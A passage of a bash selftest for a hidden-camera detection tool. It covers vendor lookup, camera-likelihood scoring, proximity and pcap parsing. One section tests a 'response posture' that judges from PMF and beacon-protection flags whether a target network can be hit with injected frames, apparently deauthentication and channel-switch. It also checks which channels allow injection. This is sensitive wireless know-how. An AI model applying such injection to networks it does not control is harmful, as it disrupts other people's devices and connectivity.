  gh="d4c3b2a1020004000000000000000000$(st_le32h 65535)$(st_le32h 127)"
  rec="$(st_le32h 0)$(st_le32h 0)$(st_le32h "$flen")$(st_le32h "$flen")"
  st_hex2bin "$gh$rec$frame" >"$f"
}
selftest() {
  local tmp="${TMPDIR:-/tmp}/cs_st.$$" f lbl n ssid
  st_stub_ui; mkdir -p "$tmp"; LOOT_DIR="$tmp"; RUN_ID="selftest"
  printf '== CamHound %s selftest ==\n' "$VERSION"
  st "stubs: every device and UI command is stubbed before the first case" "$(st_stubs_intact)" "none"
  # 1 signatures
  if f=$(find_install_dir); then load_signatures "$f/cam_signatures.txt"; SIG_SOURCE="file"; else load_signatures <(builtin_signatures); fi
  st "signatures loaded ($SIG_SOURCE, $SIG_COUNT rows)" "$(( SIG_COUNT > 20 ))" 1
  st "no rejected signature rows" "$SIG_BAD" 0
  n=$SIG_BAD; add_sig OUI SECURITY "bad label" "AA:BB:CC" 0 >/dev/null; st "bad label rejected loudly" "$SIG_BAD" "$((n + 1))"
  n=$SIG_BAD; add_sig VENDOR SECURITY "HIK-OUI" "x" 0 >/dev/null; st "duplicate label same TYPE accepted (update)" "$SIG_BAD" "$n"
  n=$SIG_BAD; add_sig SSID SECURITY "HIK-OUI" "x" 0 >/dev/null; st "label reuse across TYPEs rejected" "$SIG_BAD" "$((n + 1))"
  SIG_BAD=0; load_signatures <(builtin_signatures)   # restore clean built-ins after the lint probes
  # 2 oui.txt layouts
  printf 'EC71DB\tReolink Innovation Limited\n' >"$tmp/oui2.txt"; printf 'EC:71:DB\t(hex)\tReolink Innovation Limited\n' >"$tmp/oui3.txt"
  OUI_FILE="$tmp/oui2.txt"; vendor_of "ec:71:db:00:00:01"; st "oui.txt 2-column lookup" "${VLOW[ec:71:db:00:00:01]}" "reolink innovation limited"
  OUI_FILE="$tmp/oui3.txt"; vendor_of "ec:71:db:00:00:02"; st "oui.txt 3-column lookup" "${VLOW[ec:71:db:00:00:02]}" "reolink innovation limited"
  # 2a vendor_prefetch: one table pass must agree with the per-MAC grep it replaces, on every shape
  # the grep accepts. Each fixture below is a case an earlier prototype got WRONG, so these are
  # regression rows, not decoration.
  printf 'EC71DB0\tReolink Innovation Limited\n'            >"$tmp/ouiP.txt"   # longer first field: grep ^EC71DB prefix-matches
  printf 'eC71dB\tReolink Innovation Limited\n'             >"$tmp/ouiC.txt"   # mixed case: grep -i matches per character
  printf 'EC-71-DB\t(hex)\t\tReolink Innovation Limited\n' >"$tmp/ouiT.txt"  # canonical IEEE: double tab, bash collapses it
  printf 'EC:71:DB\tEC-71-DB\tReolink Innovation Limited\n' >"$tmp/ouiH.txt"  # hex-looking 2nd column, not literal (hex)
  local _lay _m=0 _n=""
  for _lay in oui2 oui3 ouiP ouiC ouiT ouiH; do
    OUI_FILE="$tmp/$_lay.txt"
    unset "VLOW[aa:00:00:00:10:01]" "VENDOR[aa:00:00:00:10:01]" "VLOW[ec:71:db:00:10:02]" "VENDOR[ec:71:db:00:10:02]"
    vendor_of "ec:71:db:00:10:02"                       # the grep path
    vendor_prefetch "ec:71:db:00:10:01"                 # the one-pass path, same key
    [ "${VLOW[ec:71:db:00:10:01]}" = "${VLOW[ec:71:db:00:10:02]}" ] || { _m=$((_m + 1)); _n="$_lay:[${VLOW[ec:71:db:00:10:01]}]vs[${VLOW[ec:71:db:00:10:02]}]"; }
    unset "VLOW[ec:71:db:00:10:01]" "VENDOR[ec:71:db:00:10:01]" "VLOW[ec:71:db:00:10:02]" "VENDOR[ec:71:db:00:10:02]"
  done
  st "oui batch: one pass agrees with the per-MAC grep on all six layouts" "$_m${_n:+ $_n}" "0"
  OUI_FILE="$tmp/oui2.txt"
  printf 'EC71DB\tFIRST\nEC71DB\tSECOND\n' >"$tmp/ouiD.txt"; OUI_FILE="$tmp/ouiD.txt"
  unset "VLOW[ec:71:db:00:10:03]"; vendor_prefetch "ec:71:db:00:10:03"
  st "oui batch: a duplicated OUI keeps the FIRST row, as grep -m1 does" "${VLOW[ec:71:db:00:10:03]}" "first"
  OUI_FILE="$tmp/oui2.txt"
  # A miss must be CACHED, or the batch optimises only the hits and every miss still pays a grep -
  # and the miss is the expensive case: 5.05 s on the device against ~2.5 s for an average hit.
  unset "VLOW[00:11:22:00:10:04]"; vendor_prefetch "00:11:22:00:10:04"
  st "oui batch: a miss is cached, not left to fall through to the grep" "${VLOW[00:11:22:00:10:04]+set}:[${VLOW[00:11:22:00:10:04]}]" "set:[]"
  # The randomised skip must sit AFTER the cache guard: before it, st_device's injected vendors are
  # overwritten and the scoring cases fail. This asserts both halves.
  unset "VLOW[4e:42:dc:3b:d1:33]" "VENDOR[4e:42:dc:3b:d1:33]"
  vendor_of "4e:42:dc:3b:d1:33"
  st "vendor: a randomised MAC skips the table and caches the skip" "${VLOW[4e:42:dc:3b:d1:33]+set}:[${VLOW[4e:42:dc:3b:d1:33]}]:${VENDOR[4e:42:dc:3b:d1:33]}" "set:[]:-"
  VLOW[4e:42:dc:3b:d1:34]="injected vendor"; VENDOR[4e:42:dc:3b:d1:34]="injected"
  vendor_of "4e:42:dc:3b:d1:34"
  st "vendor: the skip is after the cache guard, so an injected vendor survives" "${VLOW[4e:42:dc:3b:d1:34]}" "injected vendor"
  # THE STRUCTURAL GATE. Every gate runs on a fast x86 host with GNU grep and a 2-line fixture, so no
  # timing assertion here can ever catch a per-device file scan. Count the table reads instead: N
  # devices must cost ONE pass, not N. Without this, a regression to per-MAC grep is invisible.
  local _gn=0
  grep() { _gn=$((_gn + 1)); command grep "$@"; }
  local _d; for _d in 01 02 03 04 05 06 07 08 09 10; do unset "VLOW[ec:71:db:00:20:$_d]"; done
  vendor_prefetch ec:71:db:00:20:01 ec:71:db:00:20:02 ec:71:db:00:20:03 ec:71:db:00:20:04 ec:71:db:00:20:05 \
                  ec:71:db:00:20:06 ec:71:db:00:20:07 ec:71:db:00:20:08 ec:71:db:00:20:09 ec:71:db:00:20:10
  st "oui batch: 10 devices cost 0 greps, not 10" "$_gn" "0"
  for _d in 01 02 03 04 05 06 07 08 09 10; do vendor_of "ec:71:db:00:20:$_d"; done
  st "oui batch: and the prefetch leaves nothing for vendor_of to grep" "$_gn" "0"
  unset -f grep
  for _d in 01 02 03 04 05 06 07 08 09 10; do unset "VLOW[ec:71:db:00:20:$_d]" "VENDOR[ec:71:db:00:20:$_d]"; done
  # band_of / band_rank set globals now; a $( ) at either call site is a fork per device per cycle.
  band_of 2437; local _b2=$BAND_V; band_of 5180; local _b5=$BAND_V; band_of 6135; local _b6=$BAND_V; band_of 100; local _bq=$BAND_V
  st "band_of sets BAND_V across all four bands" "$_b2 $_b5 $_b6 $_bq" "2 5 6 ?"
  band_rank CONFIRMED; local _r3=$RANK_V; band_rank LIKELY; local _r2=$RANK_V; band_rank POSSIBLE; local _r1=$RANK_V; band_rank MODULE; local _r0=$RANK_V
  st "band_rank sets RANK_V" "$_r3 $_r2 $_r1 $_r0" "3 2 1 0"
  # 3 delimiters
  st "clean_text strips | ; and non-printables" "$(clean_text $'Cam|1;2\x01x')" "Cam_1_2x"
  # 4 scoring worked examples (section 5.1 of the plan)
  st_device aa:00:00:00:00:01 ap "Hangzhou Hikvision Digital Technology" "EZVIZ_ABCDEF123" 0; score_device aa:00:00:00:00:01
  st "Hikvision AP + EZVIZ SSID = 90 CONFIRMED" "${CONF[aa:00:00:00:00:01]} ${BANDNAME[aa:00:00:00:00:01]} ${CAT[aa:00:00:00:00:01]}" "90 CONFIRMED SECURITY"
  st_device a4:da:22:20:00:01 cli "Wyze Labs Inc" "" 0 aa:00:00:00:00:99; score_device a4:da:22:20:00:01
  st "Wyze client alone = 45 LIKELY" "${CONF[a4:da:22:20:00:01]} ${BANDNAME[a4:da:22:20:00:01]}" "45 LIKELY"
  BEH[a4:da:22:20:00:01]=55; BEH_GATE[a4:da:22:20:00:01]=55; BEH_VERDICT[a4:da:22:20:00:01]=STREAM; score_device a4:da:22:20:00:01
  st "Wyze + STREAM = 100 CONFIRMED" "${CONF[a4:da:22:20:00:01]} ${BANDNAME[a4:da:22:20:00:01]}" "100 CONFIRMED"
  BEH[a4:da:22:20:00:01]=-20; BEH_GATE[a4:da:22:20:00:01]=0; BEH_VERDICT[a4:da:22:20:00:01]=DOWN; score_device a4:da:22:20:00:01
  st "Wyze + DOWN = 45 LIKELY (floored)" "${CONF[a4:da:22:20:00:01]} ${BANDNAME[a4:da:22:20:00:01]}" "45 LIKELY"
  st_device bb:00:00:00:00:01 ap "TP-Link Systems Inc" "Tapo_Cam_1234" 0; st_device bb:00:00:00:00:02 cli "TP-Link Systems Inc" "Tapo_Cam_1234" 0 bb:00:00:00:00:01
  score_device bb:00:00:00:00:02; st "TP-Link client on Tapo_Cam AP = 65 LIKELY" "${CONF[bb:00:00:00:00:02]} ${BANDNAME[bb:00:00:00:00:02]}" "65 LIKELY"
  BEH[bb:00:00:00:00:02]=55; BEH_GATE[bb:00:00:00:00:02]=55; BEH_VERDICT[bb:00:00:00:00:02]=STREAM; score_device bb:00:00:00:00:02
  st "TP-Link + Tapo SSID + STREAM = 100 CONFIRMED (SSID class >= 45 + gate behaviour)" "${CONF[bb:00:00:00:00:02]} ${BANDNAME[bb:00:00:00:00:02]}" "100 CONFIRMED"
  st_device bb:00:00:00:00:04 cli "TP-Link Systems Inc" "" 0 aa:00:00:00:00:99; BEH[bb:00:00:00:00:04]=55; BEH_GATE[bb:00:00:00:00:04]=55; BEH_VERDICT[bb:00:00:00:00:04]=STREAM; score_device bb:00:00:00:00:04
  st "TP-Link client + STREAM = 75 LIKELY" "${CONF[bb:00:00:00:00:04]} ${BANDNAME[bb:00:00:00:00:04]}" "75 LIKELY"
  st_device cc:00:00:00:00:01 cli "Amazon Technologies Inc." "" 0 aa:00:00:00:00:99; BEH[cc:00:00:00:00:01]=75; BEH_GATE[cc:00:00:00:00:01]=75; EVENT_FLAG[cc:00:00:00:00:01]=1; BEH_VERDICT[cc:00:00:00:00:01]=EVENT; BUSY[cc:00:00:00:00:01]=1
  score_device cc:00:00:00:00:01; st "mixed vendor + EVENT + asym + BUSY = 79 LIKELY" "${CONF[cc:00:00:00:00:01]} ${BANDNAME[cc:00:00:00:00:01]}" "79 LIKELY"
  st_device cc:00:00:00:00:02 cli "Amazon Technologies Inc." "" 0 aa:00:00:00:00:99; score_device cc:00:00:00:00:02
  st "idle Blink on Amazon OUI = 20 POSSIBLE MIXED" "${CONF[cc:00:00:00:00:02]} ${BANDNAME[cc:00:00:00:00:02]} ${CAT[cc:00:00:00:00:02]}" "20 POSSIBLE MIXED"
  BEH[cc:00:00:00:00:02]=-20; BEH_GATE[cc:00:00:00:00:02]=0; BEH_VERDICT[cc:00:00:00:00:02]=DOWN; score_device cc:00:00:00:00:02
  st "Amazon client + DOWN = 0 none (the floor only protects identity 45+)" "${CONF[cc:00:00:00:00:02]} ${BANDNAME[cc:00:00:00:00:02]}" "0 none"
  unset "BEH[cc:00:00:00:00:02]" "BEH_GATE[cc:00:00:00:00:02]" "BEH_VERDICT[cc:00:00:00:00:02]"; score_device cc:00:00:00:00:02
  st_device dd:00:00:00:00:01 cli "Espressif Inc." "" 0 aa:00:00:00:00:99; score_device dd:00:00:00:00:01
  st "Espressif alone = 0 MODULE" "${CONF[dd:00:00:00:00:01]} ${BANDNAME[dd:00:00:00:00:01]} ${CAT[dd:00:00:00:00:01]}" "0 MODULE IOTMOD"
  st_device dd:00:00:00:00:02 cli "Espressif Inc." "IPC_1234" 0 aa:00:00:00:00:98; score_device dd:00:00:00:00:02
  st "Espressif on IPC_1234 AP = 15, module list, SSID tag" "${CONF[dd:00:00:00:00:02]} ${BANDNAME[dd:00:00:00:00:02]} ${TAGS[dd:00:00:00:00:02]}" "15 MODULE CAMWORD MODULE"
  st_device dd:00:00:00:00:03 cli "Espressif Inc." "" 0 aa:00:00:00:00:99; BEH[dd:00:00:00:00:03]=55; BEH_GATE[dd:00:00:00:00:03]=55; BEH_VERDICT[dd:00:00:00:00:03]=STREAM; score_device dd:00:00:00:00:03
  st "Espressif + STREAM = 55 STREAM lane" "${CONF[dd:00:00:00:00:03]} ${BANDNAME[dd:00:00:00:00:03]}" "55 STREAM"
  st_device dd:00:00:00:00:04 cli "Espressif Inc." "" 0 aa:00:00:00:00:99; BEH[dd:00:00:00:00:04]=75; BEH_GATE[dd:00:00:00:00:04]=75; EVENT_FLAG[dd:00:00:00:00:04]=1; BEH_VERDICT[dd:00:00:00:00:04]=EVENT; score_device dd:00:00:00:00:04
  st "Espressif + EVENT + asym = 75 LIKELY" "${CONF[dd:00:00:00:00:04]} ${BANDNAME[dd:00:00:00:00:04]}" "75 LIKELY"
  st_device e4:00:00:00:00:01 cli "Intel Corporate" "" 0 aa:00:00:00:00:99; BEH[e4:00:00:00:00:01]=55; BEH_GATE[e4:00:00:00:00:01]=55; BEH_VERDICT[e4:00:00:00:00:01]=STREAM; score_device e4:00:00:00:00:01
  st "Intel laptop streaming = 30 STREAM lane" "${CONF[e4:00:00:00:00:01]} ${BANDNAME[e4:00:00:00:00:01]}" "30 STREAM"
  st_device ee:00:00:00:00:01 cli "Intel Corporate" "" 0 aa:00:00:00:00:99; BEH[ee:00:00:00:00:01]=55; BEH_GATE[ee:00:00:00:00:01]=55; BEH_VERDICT[ee:00:00:00:00:01]=STREAM; score_device ee:00:00:00:00:01
  st "randomised MAC + STREAM = 0 (RAND -40 on top of ENDPOINT)" "${CONF[ee:00:00:00:00:01]} ${TAGS[ee:00:00:00:00:01]}" "0 RAND STREAM"
  st_device 02:00:00:00:00:01 cli "Amazon Technologies Inc." "" 0; PROBES[02:00:00:00:00:01]="BLINK-AB12"; score_device 02:00:00:00:00:01
  st "randomised Amazon client probing BLINK- = 0 (report only)" "${CONF[02:00:00:00:00:01]} ${BANDNAME[02:00:00:00:00:01]}" "0 none"
  st_device ff:00:00:00:00:01 cli "Liteon Technology Corporation" "" 0 aa:00:00:00:00:99; score_device ff:00:00:00:00:01
  st "Liteon-module laptop = MODULE" "${BANDNAME[ff:00:00:00:00:01]} ${CAT[ff:00:00:00:00:01]}" "MODULE IOTMOD"
  st_device bb:00:00:00:00:03 ap "TP-Link Systems Inc" "Camden Hotel" 0; score_device bb:00:00:00:00:03
  st "TP-Link AP Camden Hotel = 20 POSSIBLE (no CAMWORD)" "${CONF[bb:00:00:00:00:03]} ${BANDNAME[bb:00:00:00:00:03]} ${TAGS[bb:00:00:00:00:03]}" "20 POSSIBLE TPL-MIX"
  st_device 11:00:00:00:00:01 ap "Reolink Innovation Limited" "ReoKit" 0; st_device 11:00:00:00:00:02 cli "Reolink Innovation Limited" "ReoKit" 0 11:00:00:00:00:01; st_device 11:00:00:00:00:03 cli "Reolink Innovation Limited" "ReoKit" 0 11:00:00:00:00:01
  CLIENTS_OF=(); CLIENTS_OF[11:00:00:00:00:01]=" 11:00:00:00:00:02 11:00:00:00:00:03"; kit_eval; score_device 11:00:00:00:00:01
  st "Reolink AP + 2 Reolink clients = 80 CONFIRMED kit" "${CONF[11:00:00:00:00:01]} ${BANDNAME[11:00:00:00:00:01]} ${CAT[11:00:00:00:00:01]}" "80 CONFIRMED NVRKIT"
  st_device 02:11:22:00:00:01 ap "" "" 1; for n in 2 3 4; do st_device "a0:00:00:00:00:0$n" cli "Realtek Semiconductor Corp." "" 0 02:11:22:00:00:01; done
  CLIENTS_OF=(); CLIENTS_OF[02:11:22:00:00:01]=" a0:00:00:00:00:02 a0:00:00:00:00:03 a0:00:00:00:00:04"; kit_eval; score_device 02:11:22:00:00:01
  st "hidden LAA AP + 3 Realtek clients = KIT?" "${KITAP[02:11:22:00:00:01]} ${TAGS[02:11:22:00:00:01]}" "? KIT?"
  st_device aa:00:00:00:00:05 ap "Hangzhou Hikvision Digital Technology" "" 1; score_device aa:00:00:00:00:05
  st "hidden Hikvision AP = 55 LIKELY HIDDEN" "${CONF[aa:00:00:00:00:05]} ${BANDNAME[aa:00:00:00:00:05]} ${TAGS[aa:00:00:00:00:05]}" "55 LIKELY HIK-OUI HIDDEN"
  # 4b "Other devices": the complement of the two existing lists. Every row below is a device one
  # of them drops, and the AP cases are the gap this list was added for - before it, an AP that no
  # signature named appeared in NO list and so could not be Watched at all.
  local _oap=cc:00:00:00:00:01 _osc=cc:00:00:00:00:02 _omc=cc:00:00:00:00:03
  local _oma=cc:00:00:00:00:04 _ofa=cc:00:00:00:00:05 _ocl=cc:00:00:00:00:06 _ost=cc:00:00:00:00:07
  st_device $_oap ap "Shenzhen Nobody Ltd" "bebird-R1-038686" 0; RSSI_HIST[$_oap]="-26"; BAND[$_oap]=2; score_device $_oap
  st "other: an unscored AP under an unknown SSID is reachable at last" "$(st_other_has $_oap)" "yes"
  st_device $_osc ap "Hangzhou Hikvision Digital Technology" "EZVIZ_ABCDEF123" 0; RSSI_HIST[$_osc]="-30"; BAND[$_osc]=2; score_device $_osc
  st "other: a scored AP stays in Review hits and is not duplicated here" "$(st_other_has $_osc)" "no"
  st_device $_omc cli "Espressif Inc" "" 0 aa:00:00:00:00:99; RSSI_HIST[$_omc]="-30"; BAND[$_omc]=2; score_device $_omc
  st "other: a module CLIENT stays in the modules list" "$(st_other_has $_omc)" "no"
  st_device $_oma ap "Espressif Inc" "" 0; RSSI_HIST[$_oma]="-30"; BAND[$_oma]=2; score_device $_oma
  st "other: a module AP appears here, because the modules list refuses APs" "$(st_other_has $_oma)" "yes"
  st_device $_ofa ap "Shenzhen Nobody Ltd" "far-ap" 0; RSSI_HIST[$_ofa]="-95"; BAND[$_ofa]=2; score_device $_ofa
  st "other: a device past FAR_DBM is gated out, so the list is the room" "$(st_other_has $_ofa)" "no"
  st_device $_ocl cli "Some Laptop Vendor" "" 0 -; RSSI_HIST[$_ocl]="-40"; BAND[$_ocl]=2; score_device $_ocl
  st "other: an unscored non-module client is here too" "$(st_other_has $_ocl)" "yes"
  st_device $_ost ap "Shenzhen Nobody Ltd" "streamer-ap" 0; RSSI_HIST[$_ost]="-35"; BAND[$_ost]=2; score_device $_ost
  st "other: before Watch, a silent unknown AP is listed" "$(st_other_has $_ost)" "yes"
  BEH[$_ost]=55; BEH_GATE[$_ost]=55; BEH_VERDICT[$_ost]=STREAM; score_device $_ost
  # The drain property: Watch it, find it streaming, and it scores its way into Review hits. If this
  # ever fails the list accumulates instead of emptying as the operator works through it.
  st "other: Watched into STREAM, it promotes into Review hits and leaves this list" "$(st_other_has $_ost)" "no"
  unset "RSSI_HIST[$_oap]" "RSSI_HIST[$_osc]" "RSSI_HIST[$_omc]" "RSSI_HIST[$_oma]" "RSSI_HIST[$_ofa]" "RSSI_HIST[$_ocl]" "RSSI_HIST[$_ost]"
  unset "CONF[$_oap]" "CONF[$_osc]" "CONF[$_omc]" "CONF[$_oma]" "CONF[$_ofa]" "CONF[$_ocl]" "CONF[$_ost]"
  unset "BEH[$_ost]" "BEH_GATE[$_ost]" "BEH_VERDICT[$_ost]"
  # The filter above is well covered; the WIRING is not, and a typo in either string would make the
  # entry unreachable with every other test still green. Same technique as the SETTINGS_TABLE check.
  local _me _mc
  _me=$(sed -n 's/.*menu+=("\(Other devices\)").*/\1/p' "${BASH_SOURCE[0]}" | head -1)
  _mc=$(sed -n 's/.*"\(Other devices\)") other_list.*/\1/p' "${BASH_SOURCE[0]}" | head -1)
  st "other: the menu entry and its dispatch label are the same string" "[$_me][$_mc]" "[Other devices][Other devices]"
  # 5 proximity
  RSSI_HIST[aa:00:00:00:00:01]="-70 -58 -65"; BAND[aa:00:00:00:00:01]=2; MODE=ROOM; apply_mode; prox_of aa:00:00:00:00:01; st "prox ROOM -58 best = N" "${PROX[aa:00:00:00:00:01]}" N
  RSSI_HIST[aa:00:00:00:00:01]="-79"; prox_of aa:00:00:00:00:01; st "prox ROOM -79 = F" "${PROX[aa:00:00:00:00:01]}" F
  MODE=SITE; apply_mode; prox_of aa:00:00:00:00:01; st "prox SITE -79 = M" "${PROX[aa:00:00:00:00:01]}" M; MODE=ROOM; apply_mode
  # 6 rows / status / inventory
  RSSI_LAST[aa:00:00:00:00:01]=-58; PROX[aa:00:00:00:00:01]=N; row_for aa:00:00:00:00:01; st "row fits ROW_W" "$(( ${#ROW} <= ROW_W ))" 1
  st "row text: role glyph leads, so the column is scannable" "$ROW" "A 90 HIK-OUI N-58"
  n=$(inv_row aa:00:00:00:00:01 | awk -F'|' '{print NF}'); st "inventory row field count = header" "$n" "$(printf '%s\n' "$INV_HDR" | awk -F'|' '{print NF}')"
  # 7 pcap parser
  st_pcap "$tmp/t.pcap" 1200 20 1700000000; st "pcap buckets (10 s x 2 big frames)" "$(pcap_buckets "$tmp/t.pcap" | wc -l | tr -d ' ')" 10
  st "pcap bucket line" "$(pcap_buckets "$tmp/t.pcap" | head -1)" "1700000000 2400 2 2"
  pcap_buckets "$tmp/t.pcap" >"$tmp/t.b"; st "bucket stats" "$(bucket_stats "$tmp/t.b" | cut -d' ' -f1-4)" "10 20 24000 20"
  printf '# 1700000000 up aa:bb:cc:dd:ee:ff\n1 1200 10 2\n2 1300 11 3\n# dn\n1 90 4 0\n2 80 3 0\n# 1700000020 up aa:bb:cc:dd:ee:ff\n1 1100 9 1\n# dn\n1 70 2 0\n' >"$tmp/raw.txt"
  raw_up_rows "$tmp/raw.txt" >"$tmp/raw.b"; st "raw replay keeps the up rows of every window" "$(bucket_stats "$tmp/raw.b" | cut -d' ' -f1-4)" "3 30 3600 6"
  st "raw replay passes a bucket file through" "$(raw_up_rows "$tmp/t.b" | md5sum | cut -c1-32)" "$(md5sum <"$tmp/t.b" | cut -c1-32)"
  printf 'garbage' >"$tmp/bad.pcap"; pcap_buckets "$tmp/bad.pcap" >/dev/null 2>&1; st "bad magic rejected" "$?" 1
  # 4b capture gate: tcpdump plus EITHER hex dumper. Stub dirs, so the verdict does not depend
  #    on what happens to be installed where the selftest runs.
  mkdir -p "$tmp/gb_hd" "$tmp/gb_od" "$tmp/gb_no"; printf '#!/bin/sh\n' >"$tmp/stub"; chmod +x "$tmp/stub"
  cp "$tmp/stub" "$tmp/gb_hd/tcpdump"; cp "$tmp/stub" "$tmp/gb_hd/hexdump"
  cp "$tmp/stub" "$tmp/gb_od/tcpdump"; cp "$tmp/stub" "$tmp/gb_od/od"
  cp "$tmp/stub" "$tmp/gb_no/tcpdump"
  st "capture gate: tcpdump + hexdump"         "$(st_gate "$tmp/gb_hd")"      1
  st "capture gate: tcpdump + od, no hexdump"  "$(st_gate "$tmp/gb_od")"      1
  st "capture gate: tcpdump but no hex dumper" "$(st_gate "$tmp/gb_no")"      0
  st "capture gate: no tcpdump"                "$(st_gate "$tmp/gb_absent")"  0
  # 7b response posture (byte vectors; no radio needed)
  # RSN caps low octet: 0xcc = MFPR+MFPC, 0x8c = MFPC only, 0x0c = neither
  local XBP='0000000000000000000010'   # 11 octets, octet 10 bit 4 set -> beacon protection on
  local XNO='0000000000000000000000'   # same length, bit clear
  st "posture no PMF"               "$(posture_from_caps 0c00 - 2 6)"      "D+C"
  st "posture PMF capable only"     "$(posture_from_caps 8c00 - 2 6)"      "D?+C"
  st "posture PMF required"         "$(posture_from_caps cc00 - 2 6)"      "C"
  st "posture PMF req + beacon prot" "$(posture_from_caps cc00 "$XBP" 2 6)" "NONE"
  st "posture beacon prot bit clear" "$(posture_from_caps cc00 "$XNO" 2 6)" "C"
  st "posture short extcap ignored"  "$(posture_from_caps cc00 0000000000 2 6)" "C"
  st "posture unread rsn"           "$(posture_from_caps - - 2 6)"         "?"
  # 4c posture_of must not carry a previous target's caps into this response's loot row
  POSTURE_RSN=cc00; POSTURE_EXT=0000000000000000000010
  POSTURE[aa:00:00:00:00:f1]=C; POSTURE_TS[aa:00:00:00:00:f1]=$EPOCHSECONDS
  posture_of aa:00:00:00:00:f1 2 6 >/dev/null
  st "posture_of cache hit clears stale caps" "$POSTURE_RSN/$POSTURE_EXT" "-/-"
  POSTURE_RSN=cc00; POSTURE_EXT=0000000000000000000010
  POSTURE[aa:00:00:00:00:f3]='D?+C'; POSTURE_TS[aa:00:00:00:00:f3]=$EPOCHSECONDS; POSTURE_RSN_C[aa:00:00:00:00:f3]=8c00; POSTURE_EXT_C[aa:00:00:00:00:f3]=-
  posture_of aa:00:00:00:00:f3 2 6 >/dev/null
  st "posture_of cache hit restores this BSSID's caps" "$POSTURE_RSN/$POSTURE_EXT" "8c00/-"
  POSTURE_RSN=cc00; POSTURE_EXT=0000000000000000000010
  posture_of aa:00:00:00:00:f2 6 37 >/dev/null
  st "posture_of NOINJ exit clears stale caps" "$POSTURE_RSN/$POSTURE_EXT" "-/-"
  st "posture_of NOINJ exit still answers"     "$POSTURE_LAST"             "NOINJ"
  st "posture garbage rsn"          "$(posture_from_caps zz00 - 2 6)"      "?"
  st "posture unknown band"         "$(posture_from_caps 0c00 - '?' 6)"    "NOINJ"
  st "posture non-numeric channel"  "$(posture_from_caps 0c00 - 2 x)"      "NOINJ"
  # 7f injectability: gate 1 is pineapd's compiled-in switch, gate 2 the live regulatory
  #    state.  Both paths are pinned explicitly so the result never depends on the host.
  local _ip=$INJ_PROBED; local -A _iok=(); for k in "${!INJ_OK[@]}"; do _iok[$k]=${INJ_OK[$k]}; done
  INJ_PROBED=-1                                      # probe unavailable -> fallback set
  st "inj fallback: 2.4 ch6 allowed"      "$(posture_from_caps 0c00 - 2 6)"   "D+C"
  st "inj fallback: 2.4 ch11 allowed"     "$(posture_from_caps 0c00 - 2 11)"  "D+C"
  st "inj fallback: 2.4 ch13 refused"     "$(posture_from_caps 0c00 - 2 13)"  "NOINJ"
  st "inj fallback: 5 ch36 allowed"       "$(posture_from_caps cc00 - 5 36)"  "C"
  st "inj fallback: 5 ch149 refused"      "$(posture_from_caps 0c00 - 5 149)" "NOINJ"
  st "inj fallback: 5 DFS ch52 refused"   "$(posture_from_caps 0c00 - 5 52)"  "NOINJ"
  st "inj fallback: 6 GHz refused"        "$(posture_from_caps 0c00 - 6 37)"  "NOINJ"
  INJ_PROBED=1; INJ_OK=()                            # probe reports a US-like domain
  INJ_OK[2/6]=1; INJ_OK[2/13]=0; INJ_OK[5/36]=1; INJ_OK[5/52]=1; INJ_OK[5/149]=1; INJ_OK[6/37]=1
  st "inj probed: 2.4 ch6 allowed"        "$(posture_from_caps 0c00 - 2 6)"   "D+C"
  st "inj probed: 2.4 ch13 disabled"      "$(posture_from_caps 0c00 - 2 13)"  "NOINJ"
  st "inj probed: 5 ch149 allowed"        "$(posture_from_caps 0c00 - 5 149)" "D+C"
  st "inj probed: DFS ch52 gate-1 refused" "$(posture_from_caps 0c00 - 5 52)" "NOINJ"
  st "inj probed: DFS ch144 gate-1 refused" "$(posture_from_caps cc00 - 5 144)" "NOINJ"
  st "inj probed: 6 GHz still refused"    "$(posture_from_caps 0c00 - 6 37)"  "NOINJ"
  st "inj probed: unregistered ch refused" "$(posture_from_caps 0c00 - 5 40)" "NOINJ"
  INJ_PROBED=$_ip; INJ_OK=(); for k in "${!_iok[@]}"; do INJ_OK[$k]=${_iok[$k]}; done
  # 7g the channel parser, against the shipped iw's real layout
  local _fx; _fx=$(inj_parse_channels <<'IWFIX'
Band 1:
	* 2412 MHz [1]
	  Maximum TX power: 20.0 dBm
	  Channel widths: 20MHz HT40+
	* 2467 MHz [12] (disabled)
Band 2:
	* 5180 MHz [36]
	  Maximum TX power: 23.0 dBm
	* 5260 MHz [52]
	  Maximum TX power: 23.0 dBm
	  No IR
	  Radar detection
	* 5500 MHz [100]
	  Radar detection
IWFIX
)
  st "inj parse: row count"             "$(printf '%s\n' "$_fx" | grep -c '|')"                     "5"
  st "inj parse: 2.4 ch1 clear"         "$(printf '%s\n' "$_fx" | awk -F'|' '$2==1{print $3}')"     "0"
  st "inj parse: ch12 disabled"         "$(printf '%s\n' "$_fx" | awk -F'|' '$2==12{print $3}')"    "1"
  st "inj parse: ch36 clear"            "$(printf '%s\n' "$_fx" | awk -F'|' '$2==36{print $3}')"    "0"
  st "inj parse: ch52 No IR blocks"     "$(printf '%s\n' "$_fx" | awk -F'|' '$2==52{print $3}')"    "1"
  st "inj parse: radar alone not a block" "$(printf '%s\n' "$_fx" | awk -F'|' '$2==100{print $3}')" "0"
  st "inj parse: Passive scan blocks"   "$(printf 'Band 2:\n\t* 5180 MHz [36] \n\t  Passive scan\n' | inj_parse_channels | awk -F'|' '{print $3}')" "1"
  st "inj parse: No IBSS blocks"        "$(printf 'Band 2:\n\t* 5180 MHz [36] \n\t  No IBSS\n' | inj_parse_channels | awk -F'|' '{print $3}')" "1"
  st "inj parse: trailing space layout" "$(printf 'Band 2:\n\t* 5260 MHz [52] \n\t  Radar detection\n' | inj_parse_channels)" "5260|52|0"
  st "inj parse: frequency recovered"   "$(printf '%s\n' "$_fx" | awk -F'|' '$2==52{print $1}')"    "5260"
  st "inj parse: empty input"           "$(printf '' | inj_parse_channels | wc -l | tr -d ' ')"     "0"
  st "inj parse: garbage input"         "$(printf 'not iw output\nat all\n' | inj_parse_channels | wc -l | tr -d ' ')" "0"
  st "inj parse: phy-prefixed layout yields the phy index, not the frequency" "$(printf 'phy1 5180 MHz [36]:\n' | inj_parse_channels)" "1|36|0"
  # 7h inj_probe reads the TRANSMITTING phy's table; every phy is merged only when RECON_IF's phy is unresolved
  local _ip2=$INJ_PROBED _its=$INJ_PROBE_TS _itx=$INJ_TXPHY _isys=$INJ_SYSFS _nsys=$NET_SYSFS _rif=$RECON_IF
  local -A _iok2=(); for k in "${!INJ_OK[@]}"; do _iok2[$k]=${INJ_OK[$k]}; done
  mkdir -p "$tmp/sys/phy/phy0" "$tmp/sys/phy/phy1" "$tmp/sys/net/wlan9mon/phy80211"
